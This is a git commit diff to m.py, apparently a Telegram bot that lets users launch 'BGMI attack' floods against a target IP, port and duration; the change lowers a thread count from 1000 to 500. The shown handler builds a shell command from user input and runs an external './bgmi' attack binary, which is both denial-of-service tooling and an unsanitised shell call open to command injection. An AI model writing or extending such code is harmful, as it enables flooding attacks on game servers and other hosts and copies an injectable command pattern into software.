aa0c5aff63048f0693447e38e7f1bcdd40ff3db8
rppiif3hash <rppiif@outlook.com>
2024-06-11 21:57:49 +0530

    Update m.py

--- m.py
+++ m.py
@@ -212,7 +212,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                full_command = f"./bgmi {target} {port} {time} 1000"
+                full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI attack finished. Target: {target} Port: {port} Time: {time}"
         else:
